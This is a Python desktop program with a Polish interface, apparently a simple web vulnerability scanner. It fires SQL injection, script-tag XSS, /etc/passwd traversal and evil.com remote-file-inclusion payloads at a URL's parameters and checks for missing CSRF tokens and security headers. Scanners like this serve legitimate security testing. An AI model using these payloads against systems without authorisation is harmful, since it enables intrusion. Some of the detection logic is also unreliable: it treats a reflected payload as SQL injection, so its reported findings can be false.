import tkinter as tk
from tkinter import messagebox, scrolledtext, filedialog
import requests
from bs4 import BeautifulSoup
import re

def test_sql_injection(url, params):
    payload = "' OR 1=1 --"
    return [
        f"[!] SQL Injection możliwy w parametrze: {p}"
        for p in params
        if payload in requests.get(url, params={**params, p: payload}, timeout=5).text
    ]

def test_xss(url, params):
    payload = "<script>alert('XSS')</script>"
    return [
        f"[!] XSS możliwy w parametrze: {p}"
        for p in params
        if payload in requests.get(url, params={**params, p: payload}, timeout=5).text
    ]

def test_csrf(forms):
    return [
        "[!] Możliwy brak zabezpieczenia CSRF w formularzu."
        for f in forms
        if f.get('method', '').lower() == 'post' and not f.find('input', {'type': 'hidden', 'name': re.compile('csrf', re.I)})
    ]

def test_lfi(url, params):
    payload = "../../etc/passwd"
    return [
        f"[!] LFI możliwy w parametrze: {p}"
        for p in params
        if "root:x:" in requests.get(url, params={**params, p: payload}, timeout=5).text
    ]

def test_rfi(url, params):
    payload = "http://evil.com/shell.txt"
    return [
        f"[!] RFI możliwy w parametrze: {p}"
        for p in params
        if "evil" in requests.get(url, params={**params, p: payload}, timeout=5).text.lower()
    ]

def test_dir_traversal(url, params):
    payload = "../../../../../../../../etc/passwd"
    return [
        f"[!] Directory Traversal możliwy w parametrze: {p}"
        for p in params
        if "root:x:" in requests.get(url, params={**params, p: payload}, timeout=5).text
    ]

def test_headers(url):
    try:
        r = requests.get(url, timeout=5)
        h = r.headers
        return [
            "[!] Brak nagłówka X-Frame-Options" if "X-Frame-Options" not in h else "",
            "[!] Brak nagłówka Content-Security-Policy" if "Content-Security-Policy" not in h else "",
            "[!] Brak nagłówka X-XSS-Protection" if "X-XSS-Protection" not in h else "",
            "[!] Brak nagłówka Strict-Transport-Security" if "Strict-Transport-Security" not in h else ""
        ]
    except Exception as e:
        return [f"[!] Błąd podczas testu nagłówków: {e}"]

def validate_url(url):
    return bool(re.match(r'^https?://(?:[a-zA-Z\d-]+\.)+[a-zA-Z]{2,}', url))

def scan_url(url, tests):
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")
    except Exception as e:
        return [f"[!] Błąd połączenia: {e}"]
    params = dict(pair.split('=') for pair in url.split('?', 1)[1].split('&') if '=' in pair) if '?' in url else {}
    base = url.split('?', 1)[0]
    forms = soup.find_all('form')
    output = []
    if tests['headers']: output += [x for x in test_headers(url) if x]
    if tests['sql']: output += test_sql_injection(base, params)
    if tests['xss']: output += test_xss(base, params)
    if tests['csrf']: output += test_csrf(forms)
    if tests['lfi']: output += test_lfi(base, params)
    if tests['rfi']: output += test_rfi(base, params)
    if tests['dir']: output += test_dir_traversal(base, params)
    return output or ["[+] Nie znaleziono podatności lub brak parametrów do testowania."]

def start_scan():
    url = url_entry.get().strip()
    if not validate_url(url):
        messagebox.showerror("Błąd", "Nieprawidłowy URL. Użyj formatu http:// lub https://example.com.")
        return
    output_text.delete(1.0, tk.END)
    output_text.insert(tk.END, f"[*] Skanowanie: {url}\n")
    tests = {k: v.get() for k, v in test_vars.items()}
    try:
        for line in scan_url(url, tests):
            output_text.insert(tk.END, line + "\n")
        output_text.insert(tk.END, "[+] Skanowanie zakończone.\n")
    except Exception as e:
        output_text.insert(tk.END, f"[!] Błąd: {e}\n")

def save_results():
    results = output_text.get(1.0, tk.END)
    if not results.strip():
        messagebox.showinfo("Brak danych", "Brak wyników do zapisania.")
        return
    file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Pliki tekstowe", "*.txt")])
    if file_path:
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(results)
        messagebox.showinfo("Zapisano", f"Wyniki zapisane do {file_path}")

root = tk.Tk()
root.title("Web Application Penetration Testing Tool")
root.geometry("900x600")
root.configure(bg="white")

tk.Label(root, text="Podaj URL do przetestowania:", bg="white", fg="#222").pack(pady=5)
url_entry = tk.Entry(root, width=60, font=("Segoe UI", 10))
url_entry.insert(0, "http://testphp.vulnweb.com")
url_entry.pack(pady=5)

frame = tk.Frame(root, bg="white")
frame.pack(pady=5)

test_vars = {
    'sql': tk.BooleanVar(value=True),
    'xss': tk.BooleanVar(value=True),
    'csrf': tk.BooleanVar(value=True),
    'lfi': tk.BooleanVar(value=False),
    'rfi': tk.BooleanVar(value=False),
    'dir': tk.BooleanVar(value=False),
    'headers': tk.BooleanVar(value=True)
}

tk.Checkbutton(frame, text="SQL Injection", variable=test_vars['sql'], bg="white", fg="#009966", selectcolor="#e6ffe6").grid(row=0, column=0, sticky="w")
tk.Checkbutton(frame, text="XSS", variable=test_vars['xss'], bg="white", fg="#009966", selectcolor="#e6ffe6").grid(row=0, column=1, sticky="w")
tk.Checkbutton(frame, text="CSRF", variable=test_vars['csrf'], bg="white", fg="#009966", selectcolor="#e6ffe6").grid(row=0, column=2, sticky="w")
tk.Checkbutton(frame, text="LFI", variable=test_vars['lfi'], bg="white", fg="#009966", selectcolor="#e6ffe6").grid(row=1, column=0, sticky="w")
tk.Checkbutton(frame, text="RFI", variable=test_vars['rfi'], bg="white", fg="#009966", selectcolor="#e6ffe6").grid(row=1, column=1, sticky="w")
tk.Checkbutton(frame, text="Directory Traversal", variable=test_vars['dir'], bg="white", fg="#009966", selectcolor="#e6ffe6").grid(row=1, column=2, sticky="w")
tk.Checkbutton(frame, text="Nagłówki HTTP", variable=test_vars['headers'], bg="white", fg="#009966", selectcolor="#e6ffe6").grid(row=2, column=0, sticky="w")

btn_frame = tk.Frame(root, bg="white")
btn_frame.pack(pady=5, fill="x")
tk.Button(btn_frame, text="Skanuj", command=start_scan, bg="#009966", fg="white", font=("Segoe UI", 10, "bold")).pack(side="left", padx=10)
tk.Button(btn_frame, text="Zapisz wynik", command=save_results, bg="#e6ffe6", fg="#009966").pack(side="left", padx=10)

output_text = scrolledtext.ScrolledText(root, width=110, height=22, font=("Consolas", 10), bg="#f8f8f8", fg="#222")
output_text.pack(padx=10, pady=10, fill="both", expand=True)

root.mainloop()